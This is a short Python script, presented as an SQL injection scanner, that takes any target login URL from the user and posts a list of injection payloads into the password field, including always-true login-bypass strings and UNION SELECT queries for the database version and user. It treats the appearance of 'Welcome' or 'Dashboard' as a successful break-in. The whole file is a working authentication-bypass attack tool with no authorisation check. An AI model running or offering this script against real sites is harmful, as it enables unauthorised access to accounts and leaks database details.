import requests

# Target URL
target_url = input("Enter the target URL (e.g., http://example.com/login): ")

# SQL Injection Payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 'a'='a",
    "' UNION SELECT NULL, version() --",
    "' UNION SELECT NULL, user() --"
]

# Data format for login form (Change 'username' and 'password' to match your form field names)
post_data = {
    "username": "admin",
    "password": ""  # This will be filled with SQL injection payloads
}

print(f"\nScanning {target_url} for SQL Injection...\n")

for payload in payloads:
    post_data["password"] = payload  # Inject payload into password field
    print(f"Testing: {payload}")

    try:
        response = requests.post(target_url, data=post_data)
        
        if "Welcome" in response.text or "Dashboard" in response.text:  # Modify based on your site’s response
            print("Possible SQL Injection Detected!")
            print(f"Vulnerable payload: {payload}")
            break
    except Exception as e:
        print(f"Error: {e}")

print("Scan complete!")
